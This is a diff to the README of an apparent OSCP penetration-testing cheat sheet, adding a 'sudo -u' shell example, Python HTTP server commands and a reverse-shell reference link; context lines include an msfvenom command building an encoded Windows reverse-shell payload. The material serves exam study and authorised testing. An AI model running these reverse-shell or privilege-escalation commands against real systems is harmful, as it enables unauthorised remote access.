@@ -6,6 +6,8 @@ This repository describes cheat sheet and knowledge for OSCP.
 <!-- DON'T EDIT THIS SECTION, INSTEAD RE-RUN doctoc TO UPDATE -->
 **Table of Contents**
 
+- [oscp-cheatsheet](#oscp-cheatsheet)
+- [Contents](#contents)
 - [Enumeration](#enumeration)
   - [Network](#network)
     - [nmap](#nmap)
@@ -34,6 +36,7 @@ This repository describes cheat sheet and knowledge for OSCP.
 - [Linux command](#linux-command)
   - [Basic command](#basic-command)
     - [Show allowing commands as root user](#show-allowing-commands-as-root-user)
+    - [Run command as other user](#run-command-as-other-user)
   - [String Processing](#string-processing)
     - [Remove white spaces](#remove-white-spaces)
   - [SMB](#smb)
@@ -42,6 +45,10 @@ This repository describes cheat sheet and knowledge for OSCP.
   - [Powershell](#powershell)
     - [Create New file](#create-new-file)
     - [Display the contents of a text file](#display-the-contents-of-a-text-file)
+- [Python Standard Library](#python-standard-library)
+  - [Run HTTP Server](#run-http-server)
+    - [python3](#python3)
+    - [python2](#python2)
 - [Metasploit](#metasploit)
   - [meterpreter](#meterpreter)
   - [Get system info](#get-system-info)
@@ -56,6 +63,7 @@ This repository describes cheat sheet and knowledge for OSCP.
 - [Others](#others)
   - [References for OSCP](#references-for-oscp)
     - [GTFOBins](#gtfobins)
+    - [Reverse shell cheat sheet](#reverse-shell-cheat-sheet)
   - [References for vulnerabilities](#references-for-vulnerabilities)
     - [Shellshock (CVE-2014-6271)](#shellshock-cve-2014-6271)
 - [LICENSE](#license)
@@ -167,6 +175,18 @@ The parameter can be specified as follow:
 ```
 sudo -l
 ```
+
+### Run command as other user
+```
+sudo -u <user> <command>
+```
+e.g.
+```
+sudo -u <user> /bin/bash
+```
+
+
+
 ## String Processing
 ### Remove white spaces
 ```
@@ -193,6 +213,16 @@ New-Item <filename> -Type File
 type <filename>
 ```
 
+# Python Standard Library
+## Run HTTP Server
+### python3
+```
+python -m http.server <port>
+```
+### python2
+```
+python -m SimpleHTTPServer <port>
+```
 
 
 # Metasploit
@@ -240,6 +270,9 @@ msfvenom -p windows/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -e x86/shikata
 ### GTFOBins
 This website is a curated list of Unix binaries that can be used to bypass local security restrictions in misconfigured systems.  
 https://gtfobins.github.io/
+
+### Reverse shell cheat sheet
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
 
 ## References for vulnerabilities
 ### Shellshock (CVE-2014-6271)
